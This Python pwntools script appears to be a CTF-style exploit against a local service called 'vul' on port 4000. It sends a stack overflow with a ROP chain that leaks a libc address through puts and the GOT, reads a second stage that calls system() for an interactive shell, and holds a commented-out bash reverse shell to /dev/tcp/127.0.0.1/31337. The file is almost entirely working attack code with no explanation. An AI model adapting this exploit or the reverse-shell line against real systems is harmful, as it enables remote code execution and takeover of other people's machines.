#!/usr/bin/env python
from pwn import *
#r=process('./vul')
r = remote('127.0.0.1',4000)
huanchong = 0xf6fff100
gets = 0x08048430
puts = 0x08048460
pop_ebx_ret= 0x080483f1
ebxv = 0xf6fff000
libc_start_main_got = 0x804a02c #0xf7d45180 #0xf660e180
pop_ebp_ret = 0x0804870f
leave_ret = 0x8048528
buf = 0x0804b000-0x30
ret = 0xc3
buf2 =0x0804b000-0x10
rop1 =[
puts,
pop_ebp_ret,
libc_start_main_got,
gets,
pop_ebp_ret,
buf,
pop_ebp_ret,
buf-4,
leave_ret
]
#r.send(\x90*22) 0xf6ffd6e6
#r.send(cyclic(200))
#sh= shellcraft.sh()
#sleep(1)
r.recvuntil(':')
#raw_input('send rop1')
#r.send(('A'*92)+p32(huanchong)+''.join(map(p32,rop1))+('B'*52)+p32(ret)+'\n')
r.send(('A'*92)+p32(huanchong)+''.join(map(p32,rop1))+('B'*28)+p32(ret)+'\n')
raw_input('send rop2')
libc =0xf660e180- 0x00018180
print 'libc base =', hex(libc)
#sleep(1)
#r.recvn(4)
#li1=r.recvline()
#li = ELF(r.recvline()[:4])
#print '1=',li
#sleep(3)
#r.recvline()
#li1=r.recvline()
#print li1
#li1=u32(li1)
#print hex(li1)
#r.recvline()
#raw_input('send rop2')
libc =0xf660e180- 0x00018180
system = libc+ 0x0003a840
print 'libc base =', hex(libc)
print 'buf1 =', hex(buf)
print 'buf2 =', hex(buf2)
print 'system =',hex(system)
rop2 = [
gets,
system,
buf2,
buf2
]

r.send(''.join(map(p32,rop2))+ '\n')
#r.send('bash -c "bash -i >& /dev/tcp/127.0.0.1/31337 0>&1"\n')
r.interactive()
'''
#r.recvline()
li=r.recvn(4)
print '1=',li
li1=u32(li)
print li1
elf = ELF('/lib32/libc.so.6')
elf1 = elf.symbols['puts']
print hex(elf1)

libc = ELF(r.recvline()[:4]) - 0x00018180
print 'libc base =', hex(libc)
print u32(r.recvline()[:4])

#raw_input('send rop2')
#r.send(p32(0xf6ffd717))
#r.send('A'*80 + p32(0xf6ffc14c)+asm(sh))
r.interactive()
'''
